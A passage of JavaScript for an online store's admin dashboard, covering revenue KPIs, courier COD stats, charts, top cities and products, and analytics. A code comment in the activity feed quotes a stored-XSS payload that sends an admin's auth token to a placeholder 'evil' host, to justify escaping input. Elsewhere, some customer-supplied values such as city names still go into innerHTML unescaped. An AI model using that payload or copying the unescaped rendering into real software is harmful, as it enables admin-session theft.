  } catch(e) { toast('Dashboard error: '+e.message, 'error'); console.error(e); }
}

// COD wallet with the courier (auto-updates, no manual work)
async function loadCourierWallet() {
  try {
    const r = await apiFetch('/api/admin/courier-wallet');
    const j = await r.json();
    renderCourierWallet(j && j.wallet, j && j.sync);
  } catch(e) { /* not critical — dashboard still works */ }
}
function renderCourierWallet(w, sync) {
  const wrap = document.getElementById('courierWalletRow');
  if (!wrap) return;
  if (!w) { wrap.innerHTML = ''; return; }
  const syncLag = sync && sync.lastRunAt ? Math.round((Date.now()-new Date(sync.lastRunAt))/60000) : null;
  wrap.innerHTML = `
    <div class="stat-tick"><span class="stat-tick-ico">💵</span><div><div class="stat-tick-val">₹${fmtNum(Math.round(w.codPendingWithCourier||0))}</div><div class="stat-tick-lbl">COD with courier wallet</div></div></div>
    <div class="stat-tick up"><span class="stat-tick-ico">✅</span><div><div class="stat-tick-val">₹${fmtNum(Math.round(w.codCollectedMonth||0))}</div><div class="stat-tick-lbl">COD collected this month</div></div></div>
    <div class="stat-tick"><span class="stat-tick-ico">⏳</span><div><div class="stat-tick-val">₹${fmtNum(Math.round(w.codPendingMonth||0))}</div><div class="stat-tick-lbl">COD placed, not yet collected</div></div></div>
    <div class="stat-tick"><span class="stat-tick-ico">🚚</span><div><div class="stat-tick-val">${w.inTransitOrders||0}</div><div class="stat-tick-lbl">Orders in transit</div></div></div>
    <div class="stat-tick"><span class="stat-tick-ico">🔄</span><div><div class="stat-tick-val">${syncLag==null?'—':syncLag+'m ago'}</div><div class="stat-tick-lbl">Courier sync (auto every 10 min)</div></div></div>
  `;
}

// Renders every section of the dashboard from already-fetched data.
// Called on initial load AND whenever the global date range changes (no refetch needed).
function renderDashboardData(orders, prods, stats) {
  stats = stats || {};
  orders = orders || [];
  prods  = prods  || [];
  const isPaid = o=>(o.payment_status||'').toLowerCase().includes('paid')||o.payment_status==='SUCCESS';
  const isCollectedCOD = o=>(o.payment_status||'').toLowerCase().includes('collected');
  const isPendingCOD = o=>{ const s=(o.payment_status||'').toLowerCase(); return s.includes('cod') && !s.includes('paid'); };

  // rangeOrders = orders within the globally-selected date range — drives every range-aware widget below.
  const rangeOrders = _dashGFilterOrders(orders);
  const paidRange = rangeOrders.filter(isPaid);
  // COD counts as revenue the moment the order is placed (that is the store's main sales channel).
  // Cash still to collect from uncollected COD is shown separately as "COD outstanding".
  const collectedRange = rangeOrders.filter(o=>isPaid(o)||isCollectedCOD(o));

  // "Today" is always literal-today regardless of the selected range (Today's Revenue / Orders Today
  // are point-in-time snapshots, not trend widgets — same convention most dashboards use).
  const todayStr = new Date().toISOString().split('T')[0];
  const paidAll   = orders.filter(isPaid);
  const todayPaid = paidAll.filter(o=>(o.created_at||'').startsWith(todayStr));
  const todayAll  = orders.filter(o=>(o.created_at||'').startsWith(todayStr));
  const todayRev  = stats.todayRevenue || todayAll.reduce((s,o)=>s+parseFloat(o.total||0),0);

  // Range-based aggregates — these now respond to the dashboard-wide filter
  const rangeRev   = rangeOrders.reduce((s,o)=>s+parseFloat(o.total||0),0);
  const pending    = rangeOrders.filter(o=>(o.fulfillment||o.status||'')==='Pending').length;
  const conv       = rangeOrders.length ? ((paidRange.length/rangeOrders.length)*100) : 0;
  const avgOrder   = rangeOrders.length ? rangeRev/rangeOrders.length : 0;

  // Trend vs yesterday (today-anchored, independent of range — see note above)
  const yday = new Date(); yday.setDate(yday.getDate()-1);
  const yStr = yday.toISOString().split('T')[0];
  const yestRev = orders.filter(o=>(o.created_at||'').startsWith(yStr)).reduce((s,o)=>s+parseFloat(o.total||0),0);
  const revPct = yestRev>0?((todayRev-yestRev)/yestRev*100):0;
  const revUp = revPct>=0;

  // Revenue breakdown for KPI display — within range
  const onlineRev  = collectedRange.filter(o=>!(o.payment_status||'').toLowerCase().includes('cod')).reduce((s,o)=>s+parseFloat(o.total||0),0);
  const codRev     = collectedRange.filter(o=>(o.payment_status||'').toLowerCase().includes('cod')).reduce((s,o)=>s+parseFloat(o.total||0),0);
  const codOutstanding = rangeOrders.filter(isPendingCOD).reduce((s,o)=>s+parseFloat(o.total||0),0);
  const rangeLbl  = _dashGRangeLabel();

  // KPI Cards with animated counters
  document.getElementById('kpiCards').innerHTML = `
    <div class="kpi" style="border-color:rgba(94,171,48,0.3);">
      <div class="kpi-glow" style="background:radial-gradient(circle at 50% 0%,rgba(94,171,48,0.08),transparent 60%);"></div>
      <div class="kpi-label">Today's Revenue</div>
      <div class="kpi-val" id="kv0">₹0</div>
      <div class="kpi-trend ${revUp?'up':'down'}">${revUp?'↑':'↓'}${Math.abs(revPct).toFixed(1)}% vs yesterday</div>
      <span class="kpi-ico">💰</span>
    </div>
    <div class="kpi" style="border-color:rgba(32,128,232,0.3);">
      <div class="kpi-glow" style="background:radial-gradient(circle at 50% 0%,rgba(32,128,232,0.08),transparent 60%);"></div>
      <div class="kpi-label">Revenue · ${rangeLbl}</div>
      <div class="kpi-val" id="kv1">₹0</div>
      <div class="kpi-trend" style="color:var(--text3)">💳 ₹${fmtNum(Math.round(onlineRev))} online &nbsp;+&nbsp; 💵 ₹${fmtNum(Math.round(codRev))} COD${codOutstanding>0?` &nbsp;·&nbsp; ⏳ ₹${fmtNum(Math.round(codOutstanding))} uncollected`:''}</div>
      <span class="kpi-ico">📈</span>
    </div>
    <div class="kpi" style="border-color:rgba(232,173,44,0.3);">
      <div class="kpi-glow" style="background:radial-gradient(circle at 50% 0%,rgba(232,173,44,0.08),transparent 60%);"></div>
      <div class="kpi-label">Pending Orders · ${rangeLbl}</div>
      <div class="kpi-val" id="kv2" style="color:var(--gold-text)">0</div>
      <div class="kpi-trend" style="color:var(--gold-text)">⏳ Need action</div>
      <span class="kpi-ico">📦</span>
    </div>
    <div class="kpi" style="border-color:rgba(124,58,237,0.3);">
      <div class="kpi-glow" style="background:radial-gradient(circle at 50% 0%,rgba(124,58,237,0.08),transparent 60%);"></div>
      <div class="kpi-label">Avg Order Value</div>
      <div class="kpi-val" id="kv3">₹0</div>
      <div class="kpi-trend" style="color:var(--text3)">${rangeOrders.length} orders · ${rangeLbl}</div>
      <span class="kpi-ico">🛒</span>
    </div>
  `;
  // Animate counters
  setTimeout(()=>{
    animateCount(document.getElementById('kv0'), 0, todayRev, v=>'₹'+fmtNum(Math.round(v)));
    animateCount(document.getElementById('kv1'), 0, rangeRev, v=>'₹'+fmtNum(Math.round(v)));
    animateCount(document.getElementById('kv2'), 0, pending,  v=>Math.round(v));
    animateCount(document.getElementById('kv3'), 0, avgOrder, v=>'₹'+fmtNum(Math.round(v)));
  }, 100);

  const pendingBadgeEl = document.getElementById('pendingBadge');
  if (pendingBadgeEl) pendingBadgeEl.textContent = orders.filter(o=>(o.fulfillment||o.status||'')==='Pending').length; // nav badge always reflects true all-time pending

  // Stats Ticker — all range-aware except Low/Out of Stock (current inventory state, not time-based)
  document.getElementById('statsTicker').innerHTML = `
    <div class="stat-tick up"><span class="stat-tick-ico">📅</span><div><div class="stat-tick-val">₹${fmtNum(Math.round(rangeRev))}</div><div class="stat-tick-lbl">Revenue · ${rangeLbl}</div></div></div>
    <div class="stat-tick"><span class="stat-tick-ico">🧾</span><div><div class="stat-tick-val">${todayAll.length}</div><div class="stat-tick-lbl">Orders Today</div></div></div>
    <div class="stat-tick"><span class="stat-tick-ico">💳</span><div><div class="stat-tick-val">${conv.toFixed(1)}%</div><div class="stat-tick-lbl">Conversion · ${rangeLbl}</div></div></div>
    <div class="stat-tick"><span class="stat-tick-ico">🔴</span><div><div class="stat-tick-val">${prods.filter(p=>!p.deleted_at&&(p.stock||0)===0).length}</div><div class="stat-tick-lbl">Out of Stock</div></div></div>
    <div class="stat-tick"><span class="stat-tick-ico">🏷️</span><div><div class="stat-tick-val">${prods.filter(p=>!p.deleted_at&&(p.stock||0)>0&&(p.stock||0)<10).length}</div><div class="stat-tick-lbl">Low Stock</div></div></div>
    <div class="stat-tick"><span class="stat-tick-ico">🚚</span><div><div class="stat-tick-val">${rangeOrders.filter(o=>(o.fulfillment||o.status||'')==='Shipped').length}</div><div class="stat-tick-lbl">In Transit · ${rangeLbl}</div></div></div>
  `;

  const bucketSpec = _dashGBucketSpec();

  // Revenue chart
  renderRevenueChart(rangeOrders, bucketSpec.days, bucketSpec.customRange);

  // Sparklines — always the trailing 7 real days (today-anchored, same convention as the Today KPI)
  const last7 = Array.from({length:7},(_,i)=>{ const d=new Date(); d.setDate(d.getDate()-(6-i)); return d.toISOString().split('T')[0]; });
  const revSpark = last7.map(d=>paidAll.filter(o=>(o.created_at||'').startsWith(d)).reduce((s,o)=>s+parseFloat(o.total||0),0));
  const ordSpark = last7.map(d=>orders.filter(o=>(o.created_at||'').startsWith(d)).length);
  document.getElementById('sparkRevVal').textContent = '₹'+fmtNum(Math.round(todayRev));
  document.getElementById('sparkOrdVal').textContent = todayAll.length;
  document.getElementById('sparkConvVal').textContent = conv.toFixed(1)+'%';
  document.getElementById('sparkRevLabel').textContent = `${paidAll.length} paid all-time · 7-day trend`;
  document.getElementById('sparkOrdLabel').textContent = `${rangeOrders.length} orders · ${rangeLbl}`;
  document.getElementById('sparkConvLabel').textContent = `${paidRange.length} of ${rangeOrders.length} paid · ${rangeLbl}`;
  setTimeout(()=>{
    drawSparkline('sparkRevCanvas', revSpark, chartTheme().primary);
    drawSparkline('sparkOrdCanvas', ordSpark, chartTheme().secondary);
    document.getElementById('convFill').style.width = Math.min(conv,100)+'%';
  }, 80);

  // Status + Payment donuts — within range
  renderStatusChart(rangeOrders);
  renderPayChart(rangeOrders);

  // Hourly order pattern — aggregated across every order in the selected range
  renderHourlyChart(rangeOrders);

  // India map + top cities — within range
  const cityMap = {};
  rangeOrders.forEach(o => {
    const city = o.city||o.address_city||'Unknown';
    if(!cityMap[city]) cityMap[city]={orders:0,revenue:0};
    cityMap[city].orders++;
    cityMap[city].revenue+=parseFloat(o.total||0);
  });
  renderIndiaMap(cityMap);
  document.getElementById('mapOrderCount').textContent = Object.keys(cityMap).length+' cities';

  // Top cities chart
  const topCities = Object.entries(cityMap).sort((a,b)=>b[1].orders-a[1].orders).slice(0,8);
  const maxCity = topCities[0]?.[1].orders||1;
  const cityColors = ['#547177','#3B7EA6','#8F6417','#7C3AED','#E87020','#E53535','#06B6D4','#EC4899'];
  document.getElementById('topCitiesChart').innerHTML = topCities.map(([city,info],i)=>`
    <div class="rank-row">
      <div class="rank-num">${i+1}</div>
      <div style="display:flex;flex-direction:column;gap:3px;flex:1;min-width:0;">
        <div style="display:flex;justify-content:space-between;">
          <span class="rank-label">${city}</span>
          <span class="rank-val">${info.orders} orders</span>
        </div>
        <div class="rank-bar"><div class="rank-fill" style="width:${(info.orders/maxCity*100).toFixed(1)}%;background:${cityColors[i%cityColors.length]};"></div></div>
      </div>
    </div>`).join('') || `<div class="empty-state" style="padding:20px;">No city data · ${rangeLbl}</div>`;

  // Category revenue chart — within range
  const catRev={};
  paidRange.forEach(o=>{
    try{(typeof o.items==='string'?JSON.parse(o.items||'[]'):(o.items||[])).forEach(it=>{
      const c=it.category||'Other'; catRev[c]=(catRev[c]||0)+parseFloat(it.price||0)*(it.qty||1);
    });}catch{}
  });
  const catEntries=Object.entries(catRev).sort((a,b)=>b[1]-a[1]).slice(0,7);
  if(catEntries.length) {
    setTimeout(()=>drawHBarChart('catCanvas',catEntries.map(e=>e[0]),catEntries.map(e=>e[1]),cityColors),100);
  } else {
    const cv=document.getElementById('catCanvas'); if(cv){const ctx=cv.getContext('2d');ctx.fillStyle='rgba(106,120,96,0.5)';ctx.font='12px DM Sans,sans-serif';ctx.textAlign='center';ctx.fillText('No category data · '+rangeLbl,cv.offsetWidth/2,(cv.offsetHeight||180)/2);}
  }

  // Top products widget — within range
  const prodCount={};
  paidRange.forEach(o=>{try{(typeof o.items==='string'?JSON.parse(o.items||'[]'):(o.items||[])).forEach(it=>{prodCount[it.name||'?']=(prodCount[it.name||'?']||0)+(it.qty||1)});}catch{}});
  const topProds=Object.entries(prodCount).sort((a,b)=>b[1]-a[1]).slice(0,6);
  const maxP=topProds[0]?.[1]||1;
  document.getElementById('topProductsWidget').innerHTML = topProds.map(([name,qty],i)=>`
    <div class="rank-row">
      <div class="rank-num">${i+1}</div>
      <div style="display:flex;flex-direction:column;gap:3px;flex:1;min-width:0;">
        <div style="display:flex;justify-content:space-between;">
          <span class="rank-label">${name.length>22?name.slice(0,22)+'…':name}</span>
          <span class="rank-val">${qty} sold</span>
        </div>
        <div class="rank-bar"><div class="rank-fill" style="width:${(qty/maxP*100).toFixed(1)}%;background:${cityColors[i%cityColors.length]};"></div></div>
      </div>
    </div>`).join('') || `<div class="empty-state" style="padding:20px;">No sales data · ${rangeLbl}</div>`;

  // Activity feed — most recent within range
  const activities = [...rangeOrders].sort((a,b)=>new Date(b.created_at)-new Date(a.created_at)).slice(0,10).map(o=>({
    // esc(): customer_name is typed at checkout and rendered into the
    // dashboard's innerHTML. Unescaped, a name like
    // <img src=x onerror="fetch('//evil/'+localStorage.authToken)">
    // runs in the ADMIN's session the moment they open the dashboard —
    // stored XSS that escalates from any customer to admin. Every
    // customer-supplied field on this screen has to go through esc().
    text:`<strong>${esc(o.customer_name||'Customer')}</strong> placed order <span style="color:var(--green-text)">₹${fmtNum(o.total||0)}</span>`,
    time: fmtTime(o.created_at),
    color: isPaid(o)?'var(--green)':'var(--gold)'
  }));
  document.getElementById('activityFeed').innerHTML = activities.map(a=>`
    <div class="act-item">
      <div class="act-dot" style="background:${a.color};box-shadow:0 0 6px ${a.color}60;"></div>
      <div class="act-text">${a.text}</div>
      <div class="act-time">${a.time}</div>
    </div>`).join('') || `<div style="color:var(--text3);font-size:0.8rem;padding:12px;">No activity · ${rangeLbl}</div>`;

  // Low stock — current inventory state, not time-based (unaffected by range by design)
  const lowStock = prods.filter(p=>!p.deleted_at&&(p.stock||0)<20).sort((a,b)=>(a.stock||0)-(b.stock||0)).slice(0,6);
  document.getElementById('lowStockBadge').textContent = lowStock.length;
  document.getElementById('lowStockList').innerHTML = lowStock.map(p=>`
    <div style="display:flex;align-items:center;justify-content:space-between;padding:6px 0;border-bottom:1px solid var(--border);">
      <div><div style="font-size:0.8rem;color:var(--text)">${p.name}</div><div style="font-size:0.68rem;color:var(--text3)">${p.category||''}</div></div>
      <span class="badge ${(p.stock||0)===0?'badge-red':'badge-gold'}">${(p.stock||0)===0?'Out':p.stock+' left'}</span>
    </div>`).join('') || '<div style="color:var(--text3);font-size:0.82rem;padding:12px 0;">✅ All stocked</div>';

  // Goal widget — always calendar month-to-date (a monthly target isn't meaningful re-scoped to an
  // arbitrary custom range), clearly labelled so it reads as intentional, not inconsistent.
  const monthStart = new Date(); monthStart.setDate(1); monthStart.setHours(0,0,0,0);
  const monthRev = paidAll.filter(o=>new Date(o.created_at)>=monthStart).reduce((s,o)=>s+parseFloat(o.total||0),0);
  const goalTarget = 100000; // ₹1L monthly goal
  const goalPct = Math.min((monthRev/goalTarget)*100, 100);
  document.getElementById('goalWidget').innerHTML = `
    <div class="goal-ring"><span class="ring-glow"><canvas id="goalCanvas" style="width:100px;height:100px;display:block;"></canvas></span></div>
    <div class="goal-info">
      <span>₹${fmtNum(Math.round(monthRev))} earned</span>
      <span>₹${fmtNum(goalTarget)} goal</span>
    </div>
    <div style="font-size:0.72rem;color:var(--text3);text-align:center;margin-top:6px;">
      ${goalPct>=100?'🎉 Goal achieved!':'₹'+fmtNum(Math.round(goalTarget-monthRev))+' to go'} · This month
    </div>`;
  setTimeout(()=>drawGoalRing('goalCanvas', goalPct), 120);

  // Revenue total badge (matches Revenue Trend chart, within range)
  const el=document.getElementById('dashRevTotal'); if(el) el.textContent='₹'+fmtNum(Math.round(rangeRev));

  // Recent orders table — most recent within range
  document.getElementById('dashOrdersTbody').innerHTML = [...rangeOrders].sort((a,b)=>new Date(b.created_at)-new Date(a.created_at)).slice(0,10).map(o=>`
    <tr>
      <td class="td-id" style="color:var(--green-text);cursor:pointer" onclick="showPage('orders')">${o.id}</td>
      <td><div style="font-size:0.83rem;font-weight:500;">${esc(o.customer_name)||'-'}</div><div style="font-size:0.7rem;color:var(--text3);">${esc(o.city||o.customer_phone||'')}</div></td>
      <td style="color:var(--green-text);font-weight:600;">₹${fmtNum(o.total||0)}</td>
      <td>${payBadge(o.payment_status)}</td>
      <td>${statusBadge(o.fulfillment||o.status)}</td>
      <td style="color:var(--text3);font-size:0.75rem;">${fmtTime(o.created_at)}</td>
    </tr>`).join('') || `<tr><td colspan="6" class="empty-state">No orders · ${rangeLbl}</td></tr>`;

  // Advanced widgets (area chart, heatmap, rings, forecast, customer growth, funnel) — range-aware
  setTimeout(()=>renderAdvancedWidgets(rangeOrders, prods, bucketSpec), 300);
}

function renderRevenueChart(orders, days=7, customRange=null) {
  let buckets;
  const monthly = days >= 60; // 90D / 1Y render monthly buckets so the chart stays readable
  let spanDaysGte60 = false;
  const isPaid = o => { const s=(o.payment_status||'').toLowerCase(); return s.includes('paid')||s==='success'; };
  if (customRange && customRange.from && customRange.to) {
    const start = new Date(customRange.from), end = new Date(customRange.to);
    const spanDays = Math.max(1, Math.min(400, Math.round((end-start)/86400000) + 1));
    spanDaysGte60 = spanDays >= 60;
    if (spanDays >= 60) {
      buckets = [];
      const cur = new Date(Math.max(start.getTime(), Date.now()-366*86400000)); cur.setDate(1);
      const endM = new Date(end); endM.setDate(1);
      while (cur <= endM) {
        const key = cur.toISOString().slice(0,7);
        buckets.push({label:cur.toLocaleDateString('en-IN',{month:'short'}), key, date:key, rev:0, cnt:0});
        cur.setMonth(cur.getMonth()+1);
      }
      (orders||[]).forEach(o=>{ const b=buckets.find(b=>b.key===(o.created_at||'').slice(0,7)); if(b){b.cnt++; if(isPaid(o)) b.rev+=parseFloat(o.total||0);} });
    } else {
      buckets = Array.from({length:spanDays},(_,i)=>{
        const d=new Date(start); d.setDate(d.getDate()+i);
        return {label:spanDays<=14?d.toLocaleDateString('en-IN',{weekday:'short'}):d.getDate()+'/'+(d.getMonth()+1),
          date:d.toISOString().split('T')[0], rev:0, cnt:0};
      });
    }
  } else {
    if (monthly) {
      buckets = [];
      spanDaysGte60 = true;
      const cur = new Date(); cur.setDate(1); cur.setMonth(cur.getMonth()-Math.min(days,365)/30|0);
      const endM = new Date(); endM.setDate(1);
      while (cur <= endM) {
        const key = cur.toISOString().slice(0,7);
        buckets.push({label:cur.toLocaleDateString('en-IN',{month:'short'}), key, date:key, rev:0, cnt:0});
        cur.setMonth(cur.getMonth()+1);
      }
      (orders||[]).forEach(o=>{ const b=buckets.find(b=>b.key===(o.created_at||'').slice(0,7)); if(b){b.cnt++; if(isPaid(o)) b.rev+=parseFloat(o.total||0);} });
    } else {
      buckets = Array.from({length:Math.min(days,30)},(_,i)=>{
        const d=new Date(); d.setDate(d.getDate()-(Math.min(days,30)-1-i));
        return {label:days<=7?d.toLocaleDateString('en-IN',{weekday:'short'}):d.getDate()+'/'+(d.getMonth()+1),
          date:d.toISOString().split('T')[0], rev:0, cnt:0};
      });
    }
  }
  if (!monthly && !(customRange && customRange.from && customRange.to && spanDaysGte60)) orders.forEach(o=>{
    const isPaid=(o.payment_status||'').toLowerCase().includes('paid')||o.payment_status==='SUCCESS';
    const b=buckets.find(b=>b.date===(o.created_at||'').split('T')[0]);
    if(b){b.cnt++;if(isPaid)b.rev+=parseFloat(o.total||0);}
  });
  setTimeout(()=>drawBarChart('revenueCanvas',buckets.map(b=>b.label),buckets.map(b=>b.rev),chartTheme().primary,buckets.map(b=>b.cnt)),80);
}

function renderStatusChart(orders) {
  const counts={};
  orders.forEach(o=>{const s=o.fulfillment||o.status||'Pending';counts[s]=(counts[s]||0)+1;});
  const statusColors={Pending:'#8F6417',Processing:'#3B7EA6',Shipped:'#7C3AED',Delivered:'#547177',Cancelled:'#E53535'};
  const labels=Object.keys(counts),data=Object.values(counts);
  const colors=labels.map(l=>statusColors[l]||'#5C6A5D');
  const total=data.reduce((s,v)=>s+v,0);
  const el=document.getElementById('statusTotal'); if(el) el.textContent=total;
  setTimeout(()=>drawDonutChart('statusCanvas',labels,data,colors,total),90);
}

function renderPayChart(orders) {
  const m={'Paid':0,'COD':0,'Failed':0,'Pending':0};
  orders.forEach(o=>{
    const s=o.payment_status||'';
    if(s.toLowerCase().includes('paid')||s==='SUCCESS') m['Paid']++;
    else if(s.includes('COD')) m['COD']++;
    else if(s.toLowerCase().includes('fail')) m['Failed']++;
    else m['Pending']++;
  });
  const labels=Object.keys(m).filter(k=>m[k]>0);
  const data=labels.map(k=>m[k]);
  const colors=['#547177','#8F6417','#E53535','#5C6A5D'];
  setTimeout(()=>drawDonutChart('payCanvas',labels,data,colors),100);
}

function renderHourlyChart(orders) {
  const hourly=Array(24).fill(0);
  const today=new Date().toISOString().split('T')[0];
  orders.filter(o=>(o.created_at||'').startsWith(today)).forEach(o=>{
    const h=new Date(o.created_at).getHours(); hourly[h]++;
  });
  const peakH=hourly.indexOf(Math.max(...hourly));
  const el=document.getElementById('peakHour');
  if(el) el.textContent=hourly[peakH]>0?`Peak: ${peakH}:00`:'No orders today';
  setTimeout(()=>drawHourlyChart('hourlyCanvas',hourly),110);
}

// ═══════════════════════════════════════════════
// ANALYTICS
// ═══════════════════════════════════════════════
function onAnalyticsFilterChange() {
  const val = document.getElementById('analyticsFilter').value;
  document.getElementById('analyticsCustomBar').style.display = (val === 'custom') ? 'flex' : 'none';
  if (val !== 'custom') loadAnalytics();
}
async function loadAnalytics() {
  const filterVal = document.getElementById('analyticsFilter').value;
  let orders;
  if (filterVal === 'custom') {
    const from = document.getElementById('analyticsDateStart').value;
    const to   = document.getElementById('analyticsDateEnd').value;
    if (!from || !to) { toast('Pick both a start and end date','error'); return; }
    const fromD = new Date(from), toD = new Date(to); toD.setHours(23,59,59,999);
    orders = allOrders.filter(o => { const d = new Date(o.created_at); return d >= fromD && d <= toD; });
  } else if (filterVal === '0') {
    const todayStr = new Date().toISOString().split('T')[0];
    orders = allOrders.filter(o => (o.created_at||'').startsWith(todayStr));
  } else {
    const days = parseInt(filterVal)||30;
    const cutoff = new Date(); cutoff.setDate(cutoff.getDate() - days);
    orders = allOrders.filter(o => new Date(o.created_at) >= cutoff);
  }
  const paid   = orders.filter(o => { const s=(o.payment_status||'').toLowerCase(); return s.includes('paid')||s==='success'||s.includes('cod'); });
  const revenue = paid.reduce((s,o) => s + parseFloat(o.total||0), 0);
  const avgOrder = paid.length ? revenue / paid.length : 0;

  document.getElementById('analyticsKpis').innerHTML = `
    <div class="kpi"><div class="kpi-label">Revenue</div><div class="kpi-val">₹${fmtNum(revenue)}</div><span class="kpi-ico">💰</span></div>
    <div class="kpi"><div class="kpi-label">Orders</div><div class="kpi-val">${orders.length}</div><span class="kpi-ico">📦</span></div>
    <div class="kpi"><div class="kpi-label">Avg Order Value</div><div class="kpi-val">₹${fmtNum(avgOrder)}</div><span class="kpi-ico">📊</span></div>
    <div class="kpi"><div class="kpi-label">Conversion Rate</div><div class="kpi-val">${paid.length ? ((paid.length/orders.length)*100).toFixed(1)+'%' : '0%'}</div><span class="kpi-ico">🎯</span></div>
  `;

  // Category breakdown
  const catRev = {};
  paid.forEach(o => {
    try {
      const items = typeof o.items === 'string' ? JSON.parse(o.items||'[]') : (o.items||[]);
      items.forEach(it => {
        const cat = it.category || 'Other';
        catRev[cat] = (catRev[cat]||0) + parseFloat(it.price||0) * (it.qty||it.units||1);
      });
    } catch {}
  });
  const sortedCats = Object.entries(catRev).sort((a,b) => b[1]-a[1]);
  const maxCat = sortedCats[0]?.[1] || 1;
  document.getElementById('categoryRevChart').innerHTML = sortedCats.length ? sortedCats.map(([cat,rev]) => `
    <div style="margin-bottom:10px;">
      <div style="display:flex;justify-content:space-between;font-size:0.78rem;margin-bottom:4px;">
        <span style="color:var(--text);text-transform:capitalize;">${cat}</span>
        <span style="color:var(--green-text);font-weight:600;">₹${fmtNum(rev)}</span>
      </div>
      <div class="revenue-bar"><div class="revenue-fill" style="width:${(rev/maxCat*100).toFixed(1)}%"></div></div>
    </div>
  `).join('') : '<div class="empty-state" style="padding:24px 0;">No data for period</div>';

  // Top products by order count
  const prodCount = {};
  paid.forEach(o => {
    try {
      const items = typeof o.items === 'string' ? JSON.parse(o.items||'[]') : (o.items||[]);
      items.forEach(it => { prodCount[it.name||'?'] = (prodCount[it.name||'?']||0) + (it.qty||it.units||1); });
    } catch {}
  });
  const topProds = Object.entries(prodCount).sort((a,b) => b[1]-a[1]).slice(0,6);
  const maxProd = topProds[0]?.[1] || 1;
  document.getElementById('topProductsChart').innerHTML = topProds.length ? topProds.map(([name,qty]) => `
    <div style="margin-bottom:8px;">
      <div style="display:flex;justify-content:space-between;font-size:0.78rem;margin-bottom:3px;">
        <span style="color:var(--text);font-size:0.75rem;">${name.length>28?name.slice(0,28)+'…':name}</span>
        <span style="color:var(--text2);">${qty} sold</span>
      </div>
      <div class="revenue-bar"><div class="revenue-fill" style="width:${(qty/maxProd*100).toFixed(1)}%;background:linear-gradient(90deg,var(--gold),var(--gold-text));"></div></div>
    </div>
  `).join('') : '<div class="empty-state" style="padding:24px 0;">No data for period</div>';

  // Order volume by day
  let buckets;
  if (filterVal === 'custom') {
    const from = document.getElementById('analyticsDateStart').value;
    const to   = document.getElementById('analyticsDateEnd').value;
    const start = new Date(from), end = new Date(to);
    const spanDays = Math.max(1, Math.min(90, Math.round((end-start)/86400000) + 1));
    buckets = Array.from({length:spanDays}, (_,i) => {
      const d = new Date(start); d.setDate(d.getDate()+i);
      return {label: d.getDate()+'/'+(d.getMonth()+1), date: d.toISOString().split('T')[0], cnt:0};
    });
  } else {
    const days = parseInt(filterVal)||30;
    buckets = Array.from({length:Math.min(days,30)}, (_,i) => {
      const d = new Date(); d.setDate(d.getDate()-(Math.min(days,30)-1-i));
      return {label: d.getDate()+'/'+(d.getMonth()+1), date: d.toISOString().split('T')[0], cnt:0};
    });
  }
  orders.forEach(o => { const b = buckets.find(b=>b.date===(o.created_at||'').split('T')[0]); if(b) b.cnt++; });
  const maxOrds = Math.max(...buckets.map(b=>b.cnt),1);
  document.getElementById('orderVolumeChart').innerHTML = buckets.map(b => `
    <div style="flex:1;display:flex;flex-direction:column;align-items:center;gap:3px;min-width:18px;">
      <div style="flex:1;width:100%;display:flex;align-items:flex-end;">
        <div style="width:100%;height:${Math.max(8,(b.cnt/maxOrds)*100)}%;background:linear-gradient(180deg,var(--blue),rgba(32,128,232,0.6));border-radius:2px 2px 0 0;opacity:${b.cnt>0?1:0.25};min-height:4px;" title="${b.cnt} orders"></div>
      </div>
      <div style="font-size:0.6rem;color:var(--text3);transform:rotate(-45deg);transform-origin:top left;white-space:nowrap;margin-top:4px;">${b.label}</div>
    </div>
  `).join('');

  renderAnalyticsDoughnuts(orders);
}

let _paymentMethodChart = null, _orderStatusChart = null;
function renderAnalyticsDoughnuts(orders) {
  if (typeof Chart === 'undefined') return; // chart lib failed to load — skip gracefully

  // Payment methods
  const methodCounts = {};
  orders.forEach(o => {
    const m = o.payment_method || (o.payment_status||'').includes('COD') ? 'COD' : (o.payment_method || 'Online');
    methodCounts[m] = (methodCounts[m]||0) + 1;
  });
  const pmCtx = document.getElementById('paymentMethodChart');
  if (pmCtx) {
    if (_paymentMethodChart) _paymentMethodChart.destroy();
    _paymentMethodChart = new Chart(pmCtx, {
      type: 'doughnut',
      data: {
        labels: Object.keys(methodCounts),
        datasets: [{
          data: Object.values(methodCounts),
          backgroundColor: ['#547177','#3B7EA6','#8F6417','#E85C5C','#9B59B6'],
          borderColor: 'transparent',
        }]
      },
      options: {
        responsive: true,
        plugins: { legend: { position: 'bottom', labels: { color: '#a8b0b8', font: { size: 11 }, padding: 12 } } }
      }
    });
  }

  // Order status
  const statusCounts = {};
  orders.forEach(o => {
    const s = o.fulfillment || 'Pending';
    statusCounts[s] = (statusCounts[s]||0) + 1;
  });
  const statusColors = { Pending:'#8F6417', Processing:'#3B7EA6', Shipped:'#9B59B6', Delivered:'#547177', Cancelled:'#E85C5C' };
  const osCtx = document.getElementById('orderStatusChart');
  if (osCtx) {
    if (_orderStatusChart) _orderStatusChart.destroy();
    _orderStatusChart = new Chart(osCtx, {
      type: 'doughnut',
      data: {
        labels: Object.keys(statusCounts),
        datasets: [{
          data: Object.values(statusCounts),
          backgroundColor: Object.keys(statusCounts).map(s => statusColors[s] || '#999'),
          borderColor: 'transparent',
        }]
      },
      options: {
        responsive: true,
        plugins: { legend: { position: 'bottom', labels: { color: '#a8b0b8', font: { size: 11 }, padding: 12 } } }
      }
    });
  }
}

// Area Chart (smooth curve)
function drawAreaChart(canvasId, labels, data, color='#547177') {
  const canvas=document.getElementById(canvasId);if(!canvas)return;
  const dpr=window.devicePixelRatio||1;
  const W0=canvas.clientWidth||400,H0=canvas.clientHeight||160;
  canvas.width=W0*dpr;canvas.height=H0*dpr;
  canvas.style.width=W0+'px';canvas.style.height=H0+'px';
  const ctx=canvas.getContext('2d');ctx.scale(dpr,dpr);
  const W=W0,H=H0,pad={t:14,r:14,b:28,l:50};
  const cW=W-pad.l-pad.r,cH=H-pad.t-pad.b;
  const max=Math.max(...data,1);
  const pts=data.map((v,i)=>({x:pad.l+i*cW/(data.length-1||1),y:pad.t+cH-(v/max)*cH}));
  // Grid
  ctx.strokeStyle=chartTheme().grid;ctx.lineWidth=1;
  for(let i=0;i<=4;i++){
    const y=pad.t+cH*(1-i/4);
    ctx.beginPath();ctx.moveTo(pad.l,y);ctx.lineTo(W-pad.r,y);ctx.stroke();
    ctx.fillStyle='rgba(106,120,96,0.6)';ctx.font='8px DM Sans,sans-serif';ctx.textAlign='right';
